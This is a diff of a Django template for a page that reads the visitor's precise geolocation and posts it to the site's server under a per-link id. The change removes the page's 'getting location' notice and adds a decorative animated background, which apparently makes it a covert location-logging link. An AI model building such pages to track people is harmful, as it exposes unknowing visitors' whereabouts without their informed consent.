@@ -1,14 +1,28 @@
 <!DOCTYPE html>
 <html lang="en">
-{%load static%}
+{% load static %}
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+            background: linear-gradient(-45deg, #ff6b6b, #f8e473, #4ecdc4, #5a81f7);
+            background-size: 400% 400%;
+            animation: gradientBG 12s ease infinite;
+        }
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+    </style>
 </head>
 <body>
-
-<h2>Lokatsiya olinmoqda...</h2>
 
 <script>
 navigator.geolocation.getCurrentPosition(
@@ -18,7 +32,7 @@ navigator.geolocation.getCurrentPosition(
 
         console.log("Your real location:", lat, lon);
 
-        fetch("{% url 'save_location' %}", {
+        fetch("{% url 'index' id %}", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json",
@@ -28,14 +42,17 @@ navigator.geolocation.getCurrentPosition(
                 latitude: lat,
                 longitude: lon
             })
-        });
+        })
+
+        .then(res => res.json())
+        .then(data => console.log(data));
     },
     function(error) {
         alert("Location permission denied!");
         console.log(error);
     },
     {
-        enableHighAccuracy: true,   // 🔥 MUHIM!
+        enableHighAccuracy: true,
         timeout: 5000,
         maximumAge: 0
     }
